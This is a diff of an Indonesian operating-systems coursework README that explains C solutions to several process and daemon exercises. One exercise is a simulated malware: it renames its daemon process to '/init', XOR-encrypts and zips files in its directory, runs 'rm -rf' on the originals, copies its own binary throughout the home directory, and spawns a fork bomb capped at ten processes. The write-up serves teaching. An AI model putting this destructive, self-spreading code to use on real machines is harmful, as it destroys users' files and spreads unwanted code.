@@ -13,6 +13,7 @@
 ### Soal 1
 
 #### Penjelasan
+
 A. Downloading the Clues
 B. Filtering the Files
 C. Combine the File Content
@@ -20,15 +21,17 @@ D. Decode the file
 E. Password Check
 
 ##### Help Command
+
 ```c
-./action              
-./action -m Filter    
-./action -m Combine   
-./action -m Decode    
-./action -m Check 
+./action
+./action -m Filter
+./action -m Combine
+./action -m Decode
+./action -m Check
 ```
 
 A.
+
 ```c
 void download_and_unzip() {
     struct stat st = {0};
@@ -45,6 +48,7 @@ void download_and_unzip() {
 ```
 
 B.
+
 ```c
 void filter_files() {
     DIR *dir;
@@ -79,6 +83,7 @@ int cmp(const void *a, const void *b) {
 ```
 
 C.
+
 ```c
 void combine_files() {
     DIR *dir = opendir("Filtered");
@@ -145,6 +150,7 @@ void combine_files() {
 ```
 
 D.
+
 ```c
 void rot13_decode() {
     FILE *in = fopen("Combined.txt", "r");
@@ -169,29 +175,29 @@ void rot13_decode() {
 #### Output
 
 - help
-  
+
   ![](assets/soal_1/help.png)
-  
+
 1. Melakukan inisialisi untuk mendownload ketika tidak ada folder **Clues**
-   
+
    ![](assets/soal_1/download_extract.png)
    ![](assets/soal_1/folder_setelah_download.png)
 
-3. Melakukan filterisasi file Valid ke folder Filtered
+2. Melakukan filterisasi file Valid ke folder Filtered
 
    ![](assets/soal_1/filter.png)
    ![](assets/soal_1/folder_setelah_filter.png)
-   
-5. Menggabungkan isi file ke Combined.txt
+
+3. Menggabungkan isi file ke Combined.txt
 
    ![](assets/soal_1/combine.png)
-   
-6. Melakukan Decode File Combined.txt (ROT13) lalu dimasukkan ke Decoded.txt
+
+4. Melakukan Decode File Combined.txt (ROT13) lalu dimasukkan ke Decoded.txt
 
    ![](assets/soal_1/decode.png)
    ![](assets/soal_1/folder_setelah_combine.png)
-   
-8. Melakukan Password Checking
+
+5. Melakukan Password Checking
 
    ![](assets/soal_1/berhasil.png)
 
@@ -199,7 +205,7 @@ void rot13_decode() {
 
 #### Penjelasan
 
-
+Pertama yang dilakukan adalah melakukan setup function untuk melakukan `daemon` yaitu dengan membuat function `daemonize`.
 
 ```c
 void daemonize(char *argv0, char *daemonName) {
@@ -219,7 +225,11 @@ void daemonize(char *argv0, char *daemonName) {
     snprintf(message, sizeof(message), "Successfully started decryption process with PID %d", getpid());
     logger(message);
 }
+```
 
+Lalu selanjutnya adalah membuat function untuk membantu dan mempermudah membuat child process, disini dibuatlah function `spawn_process` dimana function ini akan menerima sebuah `callback` function yang akan dijalankan pada process yang bersangkutan.
+
+```c
 void spawn_process(char *argv0, char *processName, int (*callback)(char *argv0)) {
     pid_t pid = fork();
     if (pid < 0 || pid > 0) return;
@@ -233,48 +243,119 @@ void spawn_process(char *argv0, char *processName, int (*callback)(char *argv0))
 }
 ```
 
-Point **a**
+Function selanjutnya adalah dengan membuat function `run_command` yang tujuannya adalah sebagai wrapper untuk melakukan **execvp** untuk bisa dengan mudah digunakan dikode lainnya tanpa harus melakukan waiting process satu persatu dan membuat kode lebih clean.
 
 ```c
-int download_cb() {
-    char *wget_args[] = {
-        "wget",
-        "-q",
-        "-O",
-        "starter_kit.zip",
-        "--no-check-certificate",
-        "https://drive.google.com/uc?export=download&id=1_5GxIGfQr3mNKuavJbte_AoRkEQLXSKS",
-        NULL};
-    execvp("wget", wget_args);
-    return 1;
+int run_command(char *cmd, char *args[]) {
+    pid_t pid = fork();
+    if (pid == 0) {
+        execvp(cmd, args);
+        exit(EXIT_FAILURE);
+    } else if (pid > 0) {
+        int status;
+        waitpid(pid, &status, 0);
+        return WIFEXITED(status) && WEXITSTATUS(status) == 0;
+    } else {
+        return 0;
+    }
 }
-int extract_cb() {
-    char *unzip_args[] = {
-        "unzip",
-        "-q",
-        "starter_kit.zip",
-        "-d",
-        "starter_kit",
-        NULL};
-    execvp("unzip", unzip_args);
-    return 1;
-}
+```
+
+Point **a**
+
+Pada point soal ini ditujukan untuk mendownload file zip dari link gdrive yang sudah diberikan jika folder **starter_kit** belum ada.
+
+```c
 void download_extract_zip() {
     struct stat st;
     if (stat("starter_kit", &st) == 0 && S_ISDIR(st.st_mode)) return;
     printf("Initializing program, downloading and extract zip...\n");
 
-    spawn_process(NULL, NULL, download_cb);
+    char *wget_args[] = {"wget", "-q", "-O", "starter_kit.zip", "--no-check-certificate", FILE_DRIVE, NULL};
+    run_command("/bin/wget", wget_args);
 
-    int status;
-    wait(&status);
-    spawn_process(NULL, NULL, extract_cb);
-    wait(&status);
+    char *unzip_args[] = {"unzip", "-q", "starter_kit.zip", "-d", "starter_kit", NULL};
+    run_command("/bin/unzip", unzip_args);
+
     remove("starter_kit.zip");
 }
 ```
 
 Point **b**
+
+Pada poin ini ditujukan untuk membuat sebuah fitur yang dapat melakukan decrypt nama file yang ada pada folder **quarantine**
+
+Terdapat function **is_base64** untuk mengecek apakah value atau string tersebut adalah value dari base64 yang valid.
+
+```c
+int is_base64(char *str) {
+    const char *base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+    size_t len = strlen(str);
+    if (len % 4 != 0) return 0;
+    for (size_t i = 0; i < len; i++) {
+        if (strchr(base64_chars, str[i]) == NULL) return 0;
+    }
+    return 1;
+}
+```
+
+Lalu terdapat function **b64_decoded_size** yang digunakan untuk menghitung kira - kira sebarapa banyak size yang akan dihasilkan dari hasil decode/decrypt karakter base64 nya nanti.
+
+```c
+size_t b64_decoded_size(const char *text) {
+    size_t len = strlen(text);
+    size_t ret = len / 4 * 3;
+
+    if (len >= 1 && text[len - 1] == '=') ret--;
+    if (len >= 2 && text[len - 2] == '=') ret--;
+
+    return ret;
+}
+```
+
+Function utama untuk melakukan decrypt/decode yaitu **base64_decode** yang dimana adalah function akhir bahkan entrypoint yang digunakan untuk men-decode/decrypt karakter base64 nya.
+
+```c
+unsigned char *base64_decode(char *text, size_t *outlen) {
+    size_t len = strlen(text);
+    size_t decoded_len = b64_decoded_size(text);
+    unsigned char *out = malloc(decoded_len);
+    if (!out) return NULL;
+
+    int v;
+    size_t i, j;
+    for (i = 0, j = 0; i < len; i += 4, j += 3) {
+        v = b64invs[text[i] - 43];
+        v = (v << 6) | b64invs[text[i + 1] - 43];
+        v = (text[i + 2] == '=') ? (v << 6) : ((v << 6) | b64invs[text[i + 2] - 43]);
+        v = (text[i + 3] == '=') ? (v << 6) : ((v << 6) | b64invs[text[i + 3] - 43]);
+
+        out[j] = (v >> 16) & 0xFF;
+        if (text[i + 2] != '=') out[j + 1] = (v >> 8) & 0xFF;
+        if (text[i + 3] != '=') out[j + 2] = v & 0xFF;
+    }
+
+    if (outlen) *outlen = decoded_len;
+    return out;
+}
+```
+
+Untuk function **sanitize_filename** disini digunakan untuk melakukan filterisasi dan normalisasi karakter - karakter non-printable yang dihasilkan dari hasil decrypt/decode base64nya dan memastikan bahwa setiap karakter hasil decode nya merupakan valid sebagai filename.
+
+```c
+void sanitize_filename(unsigned char *buf, size_t len) {
+    size_t j = 0;
+    for (size_t i = 0; i < len; i++) {
+        if (isprint(buf[i]) && buf[i] != '/' && buf[i] != '\\' && buf[i] != '\n' && buf[i] != '\r') {
+            buf[j++] = buf[i];
+        }
+    }
+    buf[j] = '\0';
+}
+```
+
+Selanjutnya ini adalah function utama yang akan menjadi entrypoint fitur untuk melakukan decrypt dan melakukan running processnya.
+Dimana kurang lebih function ini akan melakukan read directory **quarantine** dan membaca semua isinya, dan mengecek untuk file tersebut memiliki nama base64, dan jika valid maka akan didecode.
 
 ```c
 int decrypt_filename() {
@@ -294,10 +375,14 @@ int decrypt_filename() {
         if (entry->d_type == DT_DIR) continue;
         if (strrchr(entry->d_name, '.')) continue;
         if (!is_base64(entry->d_name)) continue;
-        char *decoded_name = base64_decode(entry->d_name);
 
-        char new_name[PATH_MAX];
-        char old_name[PATH_MAX];
+        size_t decoded_len;
+        unsigned char *decoded_name = base64_decode(entry->d_name, &decoded_len);
+        if (!decoded_name) continue;
+
+        sanitize_filename(decoded_name, decoded_len);
+
+        char new_name[PATH_MAX], old_name[PATH_MAX];
         snprintf(old_name, sizeof(old_name), "%s/%s", foldername, entry->d_name);
         snprintf(new_name, sizeof(new_name), "%s/%s", foldername, decoded_name);
 
@@ -311,6 +396,10 @@ int decrypt_filename() {
 ```
 
 Point **c**
+
+Selanjutnya untuk poin c adalah fitur untuk memindahkan file dari sebuah folder, yaitu dari **starter_kit** ke **quarantine** dan sebaliknya.
+
+Oleh karena itu dibuatlah 1 function saja yang dapat menghandle fungsionalitas tersebut yaitu function `move_files` yang fungsinya adalah untuk memindahkan file dari folder A ke folder B.
 
 ```c
 int move_files(char *old_folder, char *new_folder) {
@@ -348,8 +437,9 @@ int move_files(char *old_folder, char *new_folder) {
 
 Point **d**
 
-```c
+Untuk poin d adalah fitur untuk menghapus file dari folder **quarantine** satu persatum, jadi disini dibuatlah function `delfiles` yang dimana akan melakukan read directory dari parameternya dan kemudian menghapusnya satu persatu file yang ada dalam directory tersebut.
 
+```c
 int delfiles(char *foldername) {
     DIR *dir;
     struct dirent *entry;
@@ -373,7 +463,9 @@ int delfiles(char *foldername) {
 }
 ```
 
-Point **f**
+Point **e**
+
+Poin e ini digunakan untuk mematikan daemon process yang dijalankan oleh handle process sebelumnya yaitu handle process untuk melakukan decrypt nama file, oleh karena itu dibuatlah function `shutdown` dimana akan mencoba melakukan read pid sesuai dengan nama processnya dan kemudian melakukan kill dengan signal `SIGTERM` untuk melakukan gracefull shutdown, sesuai dengan perintah soal.
 
 ```c
 int shutdown(char *processName) {
@@ -396,7 +488,25 @@ int shutdown(char *processName) {
 }
 ```
 
+Point **f**
+
+Handle error sudah dilakukan dan akan dijelaskan pada bagian selanjutnya. Namun disini kurang lebih dibuat function `help` untuk mencoba callback function ketika ada sesuatu yang salah atau tidak sesuai.
+
+```c
+void help() {
+    printf("Usage: starterkit <command>\n");
+    printf("Available commands:\n");
+    printf("\t--decrypt\n");
+    printf("\t--quarantine\n");
+    printf("\t--return\n");
+    printf("\t--eradicate\n");
+    printf("\t--shutdown\n");
+}
+```
+
 Point **g**
+
+Untuk melakukan logging disini membuat function **logger** yang akan memasukkan log message ke file, dimana function ini juga sudah dipanggil ditempat - tempat dimana soal meminta untuk dilakukan logging.
 
 ```c
 void logger(char *message) {
@@ -412,36 +522,88 @@ void logger(char *message) {
 }
 ```
 
+Kemudian terakhir adalah untuk main entrypoint yang akan menjadi handle untuk setiap argument dari program ini.
+
+```c
+int main(int argc, char *argv[]) {
+    download_extract_zip();
+    if (argc < 2 || argc > 2) {
+        help();
+        return 1;
+    }
+
+    char *command = argv[1];
+    if (strcmp(command, "--decrypt") == 0) {
+        daemonize(argv[0], "starterkit-decryptor");
+        while (1) {
+            decrypt_filename();
+            sleep(1);
+        }
+    } else if (strcmp(command, "--quarantine") == 0) {
+        move_files("starter_kit", "quarantine");
+    } else if (strcmp(command, "--return") == 0) {
+        move_files("quarantine", "starter_kit");
+    } else if (strcmp(command, "--eradicate") == 0) {
+        delfiles("quarantine");
+    } else if (strcmp(command, "--shutdown") == 0) {
+        shutdown("starterkit-decryptor");
+    } else {
+        help();
+        return 1;
+    }
+
+    return 0;
+}
+```
+
 #### Output
 
 1. Melakukan inisialisi untuk mendownload ketika tidak ada folder **starter_kit** dan akan menampilkan help command
 
+Ketika program pertama kali dijalankan dan tidak folder **starter_kit** maka akan membuat mendownload zip dan melakukan ekstraksi kemudian menampilkan help message.
 ![](assets/soal_2/init.png)
+
+Dan ini adalah output ketika selesai dilakukan download dan ekstraksi zipnya.
 ![](assets/soal_2/after-init.png)
 
 2. Melakukan start decrypting
 
+Ketika daemon process decryption dijalankan
 ![](assets/soal_2/decryption.png)
+
+Log yang menyatakan bahwa daemomn process berhasil dijalankan
 ![](assets/soal_2/start-decrypt-log.png)
 
 3. Memindahkan file dari **starter_kit** ke **quarantine**
 
+Proof ketika perpindahan file dari **starter_kit** ke **quarantine** dijalankan.
 ![](assets/soal_2/move-quarantine.png)
+
+Hasil log ketika berhasil memindahkan
 ![](assets/soal_2/move-quarantine-log.png)
 
 3. Memindahkan file dari **quarantine** ke **starter_kit**
 
+Proof ketika perpindahan file dari **quarantine** ke **starter_kit** dijalankan.
 ![](assets/soal_2/move-starter_kit.png)
+
+Hasil log ketika berhasil memindahkan
 ![](assets/soal_2/move-starter_kit-log.png)
 
 4. Menghapus semua file dari folder **quarantine**
 
+Eksekusi command untuk melakukan penghapus file di **quarantine** atau eradicate
 ![](assets/soal_2/eradicate.png)
+
+Hasil log yang menunjukan berhasilnya proses penghapusan
 ![](assets/soal_2/eradicate-log.png)
 
 5. Shutdown process
 
+Eksekusi command untuk menghentikan daemon process sebelumnya
 ![](assets/soal_2/shutdown.png)
+
+Hasil log ketika berhasil menghentikan processnya
 ![](assets/soal_2/shutdown-log.png)
 
 #### Kendala
@@ -451,6 +613,8 @@ Tidak ada kendala
 ### Soal 3
 
 #### Penjelasan
+
+Membuat function untuk membantu dan mempermudah membuat child process, disini dibuatlah function `spawn_process` dimana function ini akan menerima sebuah `callback` function yang akan dijalankan pada process yang bersangkutan.
 
 ```c
 void spawn_process(char *argv0, char processName[], int (*callback)(char *argv0, char *args[]), char *args[]) {
@@ -464,7 +628,27 @@ void spawn_process(char *argv0, char processName[], int (*callback)(char *argv0,
 }
 ```
 
+Function selanjutnya adalah dengan membuat function `run_command` yang tujuannya adalah sebagai wrapper untuk melakukan **execvp** untuk bisa dengan mudah digunakan dikode lainnya tanpa harus melakukan waiting process satu persatu dan membuat kode lebih clean.
+
+```c
+int run_command(char *cmd, char *args[]) {
+    pid_t pid = fork();
+    if (pid == 0) {
+        execvp(cmd, args);
+        exit(EXIT_FAILURE);
+    } else if (pid > 0) {
+        int status;
+        waitpid(pid, &status, 0);
+        return WIFEXITED(status) && WEXITSTATUS(status) == 0;
+    } else {
+        return 0;
+    }
+}
+```
+
 Point **a**
+
+Untuk poin a yaitu diperintahkan untuk membuat daemon process oleh karena itu disini dibuatlah function `daemonize` untuk membaut daemon process dan kemudian melakukan renaming thread process nya menjadi `/init`
 
 ```c
 void daemonize(char *argv0) {
@@ -484,6 +668,10 @@ void daemonize(char *argv0) {
 ```
 
 Point **b**
+
+Lalu untuk poin b adalah handler process untuk melakukan encryption filesystem dicurrent directory dimana binary ini dijalankan.
+
+Pertama adalah membuat function `xor_file`, sesuai namanya function ini akan melakukan xor encryption dimana menggunakan key dari current timestamp sesuai dengan petunjuk soal.
 
 ```c
 int xor_file(const char *filename, time_t timestamp) {
@@ -526,7 +714,11 @@ cleanup:
 
     return 0;
 }
+```
 
+Lalu kemudian ini adalah function untuk melakukan handler processnya, dimana function ini akan membaca current directory dan melakukan encryption menggunakan metode zip, yaitu jika yang dibaca adalah folder maka dilakukan zip pada folder tersebut dan kemudian melakukan encryption dan folder sebelumnya dihapus, dan jika file bisa langsung dienkripsi secara langsung, dan akan terus berjalan dengan interval waktu 30 detik.
+
+```c
 int wannacryptor() {
     while (1) {
         DIR *dir = opendir(".");
@@ -541,37 +733,14 @@ int wannacryptor() {
             if (entry->d_type == DT_DIR) {
                 char zipname[PATH_MAX];
                 snprintf(zipname, sizeof(zipname), "%s.zip", entry->d_name);
-                pid_t pid = fork();
 
-                if (pid < 0) continue;
+                char *zip_args[] = {"zip", "-qr", zipname, entry->d_name, NULL};
+                run_command("/bin/zip", zip_args);
 
-                if (pid == 0) {
-                    char *args[] = {
-                        "zip",
-                        "-qr",
-                        zipname,
-                        entry->d_name,
-                        NULL};
-                    execvp("/bin/zip", args);
-                    _exit(1);
-                } else {
-                    int status;
-                    waitpid(pid, &status, 0);
-                    xor_file(zipname, timestamp);
-                    pid_t rm_pid = fork();
-                    if (rm_pid < 0) continue;
-                    if (rm_pid == 0) {
-                        char *args[] = {
-                            "rm",
-                            "-rf",
-                            entry->d_name,
-                            NULL};
-                        execvp("/bin/rm", args);
-                        _exit(1);
-                    } else {
-                        waitpid(rm_pid, &status, 0);
-                    }
-                }
+                xor_file(zipname, timestamp);
+
+                char *rm_args[] = {"rm", "-rf", entry->d_name, NULL};
+                run_command("/bin/rm", rm_args);
             }
         }
 
@@ -583,6 +752,10 @@ int wannacryptor() {
 ```
 
 Point **c - d**
+
+Untuk poin c adalah melakukan simulasi _propagation_ malware, dimana melakukan self clone binarynya sendiri untuk disebarkan diarea home directory korban.
+
+Pertama membuat function `cloneFile` tentu saja ini digunakan untuk melakukan clone sebuah file ke target directorynya, secara recursive hingga ke dalam.
 
 ```c
 int cloneFile(char *baseDirpath, char *filename, FILE *file) {
@@ -619,7 +792,11 @@ int cloneFile(char *baseDirpath, char *filename, FILE *file) {
     closedir(dir);
     return 0;
 }
+```
 
+Untuk function `trojan` adalah handler process untuk melakukan `propagation` dari malwarenya, dimana akan melakukan copy dari self filenya sendiri ke home directory user saat ini secara recursive.
+
+```c
 int trojan() {
     char self[1024];
     ssize_t len = readlink("/proc/self/exe", self, sizeof(self) - 1);
@@ -651,7 +828,13 @@ int trojan() {
 }
 ```
 
+Untuk poin d bisa dilihat bahwa penerapan sleep dan while loop sudah menjadi proof bahwa process ini akan tetap hidup diinterval 30 detik.
+
 Point **e - h**
+
+Untuk poin e dan h ditujukan untuk melakukan simulasi `fork bomb` dimana program akan melakukan forking process secara terus menerus. Pada aslinya fork bomb tidak akan melakukan batasan berapa forking process yang akan dilakukan, namun pada kasus ini dibatasi hanya 10 process saja.
+
+Yang pertama dibuat adalah function `mining` dimana ini akan melakukan write hex value dengan datetime ke file untuk seolah-olah melakukan mining process.
 
 ```c
 int mining(char *argv0, char *args[]) {
@@ -685,7 +868,11 @@ int mining(char *argv0, char *args[]) {
     }
     return 0;
 }
+```
 
+Kemudian function `rodok` ini adalah sebagai handler process dari `fork bomb` tadi dimana akan melakukan spawning process dan melakukan mining ke file yang dituju. Dengan max process nya sebanyak 10 process.
+
+```c
 int rodok(char *argv0, char *args[]) {
     int MAX_MINER = 10;
     pid_t pids[MAX_MINER];
@@ -708,22 +895,34 @@ int rodok(char *argv0, char *args[]) {
 
 #### Output
 
+Menjalankan program untuk pertama kalinya.
 ![](assets/soal_3/run.png)
+
+Proof bahwa program berhasil berjalan secara daemon process dan dengan tree process sesuai dengan soal.
 ![](assets/soal_3/tree-process.png)
 
 1. Enkripsi file (zip mode)
 
+Kondisi ketika proses enkripsi belum dilakukan
 ![](assets/soal_3/before-encrypt.png)
+
+Kondisi setelah proses enkripsi mulai berjalan
 ![](assets/soal_3/after-encrypt.png)
 
 2. Melakukan clone binary nya sendiri
 
+Kondisi ketika proses _propagation_ belum dilakukan
 ![](assets/soal_3/tree-home.png)
+
+Kondisi ketika proses _propagation_ mulai berjalan
 ![](assets/soal_3/tree-home-after-run.png)
 
 3. Fork bomb
 
+Kondisi proof dari log sebelum proses fork bomb dilakukan
 ![](assets/soal_3/before-fork-bomb.png)
+
+Kondisi dari log setelah proses fork bomb berjalan
 ![](assets/soal_3/after-fork-bomb.png)
 
 #### Kendala
@@ -746,7 +945,7 @@ void show_process(const char *username){
         exit(EXIT_FAILURE);
     } else if (pid > 0){
         wait(NULL);
-        write_log("list", "RUNNING"); 
+        write_log("list", "RUNNING");
     }
 }
 ```
@@ -761,7 +960,7 @@ void run_daemon(const char *username) {
     if (pid < 0) {
         exit(EXIT_FAILURE);
     }  if (pid > 0) {
-        exit(EXIT_SUCCESS); 
+        exit(EXIT_SUCCESS);
     }
 
     char pid_file[64];
@@ -789,7 +988,7 @@ void run_daemon(const char *username) {
 
 **c. Menghentikan pengawasan**
 
-````c
+```c
 void stop_daemon(const char *username) {
     char pid_file[64];
     snprintf(pid_file, sizeof(pid_file), "daemon_%s.pid", username);
@@ -806,17 +1005,17 @@ void stop_daemon(const char *username) {
 
     if (kill(pid, SIGTERM) == 0) {
         printf("Daemon user %s successfuly stopped.\n", username);
-        remove(pid_file); 
+        remove(pid_file);
     } else {
         perror("Failed to stopped daemon user %s");
     }
     write_log("stop", "RUNNING");
 }
-````
+```
 
 **d. Menggagalkan semua proses user yang sedang berjalan**
 
-````c
+```c
 void fail_user(const char *username) {
     pid_t pid = fork();
 
@@ -828,14 +1027,13 @@ void fail_user(const char *username) {
         wait(NULL);
         write_log("fail", "FAILED");
         printf("Successfuly stop all %s process\n", username);
-    } 
+    }
 }
-````
-
+```
 
 **e. Mengizinkan user untuk kembali menjalankan proses**
 
-````c
+```c
 void revert_user(const char *username) {
     pid_t pid = fork();
 
@@ -849,12 +1047,11 @@ void revert_user(const char *username) {
         printf("Successfully reverted user %s process\n", username);
     }
 }
-````
-
+```
 
 **f. Mencatat ke dalam file log**
 
-````c
+```c
 void write_log(const char *process_name, const char *status) {
     FILE *log_file = fopen("/home/asuramawaru/debugmon.log", "a");
     if (!log_file) {
@@ -868,13 +1065,12 @@ void write_log(const char *process_name, const char *status) {
     char time[32];
 
     strftime(date, sizeof(date), "%d:%m:%Y", t);
-    strftime(time, sizeof(time), "%H:%M:%S", t); 
+    strftime(time, sizeof(time), "%H:%M:%S", t);
 
     fprintf(log_file, "[%s]-[%s]_%s_STATUS(%s)\n", date, time, process_name, status);
     fclose(log_file);
 }
-````
-
+```
 
 #### output
 
@@ -903,3 +1099,7 @@ void write_log(const char *process_name, const char *status) {
 6. mencatat penggunaan debugmon ke dalam file log
 
 ![](assets/soal_4/debugmon.log.png)
+
+```
+
+```
